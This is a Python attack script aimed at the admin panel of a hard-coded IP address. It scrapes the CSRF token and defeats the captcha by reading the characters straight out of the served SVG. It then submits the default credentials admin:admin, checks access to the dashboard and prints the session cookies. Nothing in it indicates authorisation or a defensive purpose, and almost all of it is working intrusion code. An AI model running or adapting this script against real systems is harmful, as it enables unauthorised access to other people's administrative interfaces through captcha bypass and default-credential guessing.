#!/usr/bin/env python3
"""
Admin login test with proper session handling
"""

import requests
import re
import json
import time

TARGET = "https://210.69.42.55"
session = requests.Session()
session.verify = False

def get_captcha_chars():
    """Extract captcha from SVG text elements"""
    r = session.get(f"{TARGET}/admin/captcha")
    svg = r.text
    # Extract all text content from SVG
    chars = re.findall(r'<text[^>]*>([A-Za-z0-9])</text>', svg)
    return ''.join(chars)

def login(username, password):
    """Attempt login and return session if successful"""
    # Get login page
    r = session.get(f"{TARGET}/admin/login")
    token = re.search(r'name="_token" value="([^"]+)"', r.text)
    if not token:
        print("[-] No CSRF token found")
        return None
    token = token.group(1)
    
    # Get captcha
    captcha = get_captcha_chars()
    
    # Submit login
    data = {
        '_token': token,
        'username': username,
        'password': password,
        'captcha': captcha
    }
    
    r = session.post(f"{TARGET}/admin/login", data=data, allow_redirects=False)
    print(f"[*] {username}:{password} -> {r.status_code}")
    print(f"[*] Location: {r.headers.get('Location', 'N/A')}")
    print(f"[*] Cookies: {dict(session.cookies)}")
    
    if r.status_code == 302:
        # Check if we can access admin area
        dash = session.get(f"{TARGET}/admin/dashboard")
        if "419" in dash.text:
            print("[-] Session expired after login")
            return None
        else:
            print("[+] Dashboard accessed successfully!")
            return session
    
    return None

# Test
print("[*] Testing admin:admin")
session = login("admin", "admin")